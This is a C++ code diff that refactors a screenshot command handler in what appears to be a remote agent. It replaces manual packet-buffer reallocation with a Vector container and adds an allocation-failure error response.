@@ -546,7 +546,14 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
         PRGB rectScan0 = nullptr;
         USIZE packetSize = *responseLength + sizeof(UINT32); // Initial packet size with space for count of segments
         // Allocate memory for packet
-        PCHAR packet = new CHAR[packetSize];
+        Vector<CHAR> packetVector;
+        if (!packetVector.Init()){
+            LOG_ERROR("Failed to allocate memory for packet buffer.");
+            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+            return;
+        }
+        packetVector.Resize(packetSize);
+
         USIZE offset = sizeof(UINT32) + sizeof(UINT32);
 
         PContourNode hierarchy = contours.Hierarchy;
@@ -635,14 +642,11 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
                 packetSize += jpegBuffer.size + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData);
 
                 // Reallocate memory for the packet to hold the new rectangle data
-                auto newPacket = new CHAR[packetSize];
-                Memory::Copy(newPacket, packet, offset);
-                delete[] packet;
-                packet = newPacket;
+                packetVector.Resize(packetSize);
 
                 LOG_INFO("Memory allocated.");
 
-                offset += rect.toBuffer((UINT8 *)packet + offset);
+                offset += rect.toBuffer((UINT8 *)packetVector.Data + offset);
 
                 LOG_INFO("Cleaning up.");
 
@@ -656,10 +660,10 @@ VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]
         Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));
 
         // Set the count of contours in the packet
-        *(PUINT32)(packet + sizeof(UINT32)) = countOfContour;
+        *(PUINT32)(packetVector.Data + sizeof(UINT32)) = countOfContour;
         // Set the size of the packet and the response
-        *response = packet;
-        *responseLength = packetSize;
+        *response = packetVector.Data;
+        *responseLength = packetVector.Count;
         *(PUINT32)*response = StatusCode::StatusSuccess;
 
         // Clean up resources used for contour detection
